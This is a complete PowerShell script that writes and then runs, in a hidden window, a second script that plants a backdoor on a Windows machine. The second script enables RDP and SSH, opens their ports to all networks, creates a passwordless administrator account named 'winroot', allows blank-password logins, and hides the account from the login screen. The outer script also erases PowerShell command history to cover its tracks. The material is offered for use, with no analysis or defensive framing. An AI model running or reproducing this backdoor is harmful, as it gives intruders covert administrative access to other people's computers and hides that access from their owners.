Set-PSReadlineOption -HistorySaveStyle SaveNothing

# 1. Create the PowerShell setup script
@'
$ErrorActionPreference = "Stop"

# Ensure script runs as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "❌ Please run this script as Administrator!" -ForegroundColor Red
    Exit
}

Write-Host "✅ Running Secure Setup..." -ForegroundColor Green

# Enable RDP Service
Write-Host "✅ Enabling Remote Desktop (RDP)..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Set-Service -Name TermService -StartupType Automatic
Start-Service TermService

# Open RDP Firewall Port (3389)
Write-Host "✅ Configuring firewall for RDP..." -ForegroundColor Cyan
Remove-NetFirewallRule -DisplayName "Allow RDP (Port 3389)" -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Allow RDP (Port 3389)" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Any

# Install & Enable OpenSSH Server
Write-Host "✅ Installing OpenSSH Server..." -ForegroundColor Cyan
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Set-Service -Name sshd -StartupType Automatic
Start-Service sshd

# Open SSH Firewall Port (22)
Write-Host "✅ Configuring firewall for SSH..." -ForegroundColor Cyan
Remove-NetFirewallRule -DisplayName "Allow SSH (Port 22)" -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "Allow SSH (Port 22)" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -Profile Any

# Create "winroot" User Without a Password
$Username = "winroot"
if (-not (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue)) {
    Write-Host "✅ Creating user '$Username' without a password..." -ForegroundColor Cyan
    New-LocalUser -Name $Username -NoPassword -Description "Passwordless RDP & SSH User"
} else {
    Write-Host "⚠ User '$Username' already exists, skipping creation." -ForegroundColor Yellow
}

# Add "winroot" to Administrators Group
if (-not (Get-LocalGroupMember -Group "Administrators" | Where-Object { $_.Name -match $Username })) {
    Add-LocalGroupMember -Group "Administrators" -Member $Username
    Write-Host "✅ Added '$Username' to Administrators." -ForegroundColor Cyan
} else {
    Write-Host "⚠ '$Username' is already in Administrators." -ForegroundColor Yellow
}

# Ensure "winroot" Can Use RDP
Write-Host "✅ Ensuring '$Username' can use RDP..." -ForegroundColor Cyan
$rdpGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.Name -like "*Remote Desktop*" }
if ($rdpGroup) {
    if (-not (Get-LocalGroupMember -Group $rdpGroup.Name | Where-Object { $_.Name -match $Username })) {
        Add-LocalGroupMember -Group $rdpGroup.Name -Member $Username
        Write-Host "✅ Added '$Username' to '$($rdpGroup.Name)'." -ForegroundColor Cyan
    } else {
        Write-Host "⚠ '$Username' is already in '$($rdpGroup.Name)', skipping." -ForegroundColor Yellow
    }
} else {
    Write-Host "⚠ Warning: Remote Desktop Users group not found. You may need to add '$Username' manually." -ForegroundColor Yellow
}

# Allow Passwordless Login for RDP
Write-Host "✅ Allowing '$Username' to log in without a password..." -ForegroundColor Cyan
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "LimitBlankPasswordUse" -Value 0

# Configure SSH for Passwordless Login
Write-Host "✅ Configuring SSH to allow passwordless login..." -ForegroundColor Cyan
$sshd_config = "C:\ProgramData\ssh\sshd_config"
if (!(Test-Path $sshd_config)) { 
    Write-Host "⚠ Warning: SSH config not found. OpenSSH may not be installed correctly." -ForegroundColor Yellow
} else {
    (Get-Content $sshd_config) -replace '^#?PermitEmptyPasswords no', 'PermitEmptyPasswords yes' | Set-Content $sshd_config
    Restart-Service sshd
    Write-Host "✅ SSH now allows passwordless login." -ForegroundColor Cyan
}

# Hide "winroot" User from Login Screen
Write-Host "✅ Hiding '$Username' from login screen..." -ForegroundColor Cyan
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name $Username -Value 0

# Restart RDP & SSH Services
Write-Host "✅ Restarting RDP and SSH services..." -ForegroundColor Cyan
Restart-Service TermService
Restart-Service sshd

# Verify Setup
Write-Host "✅ Verifying services..." -ForegroundColor Green
Write-Host "RDP (3389) Status: " (Get-Service TermService).Status
Write-Host "SSH (22) Status: " (Get-Service sshd).Status
Write-Host "✅ Setup Complete! You can now connect using '$Username' with no password via RDP or SSH. The account is hidden from the login screen." -ForegroundColor Green
'@ | Set-Content -Path "C:\setup-rdp-ssh.ps1"

# 2. Execute the script silently without an open window
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\setup-rdp-ssh.ps1" -WindowStyle Hidden -Verb RunAs
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
Set-PSReadlineOption -HistorySaveStyle SaveNothing
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
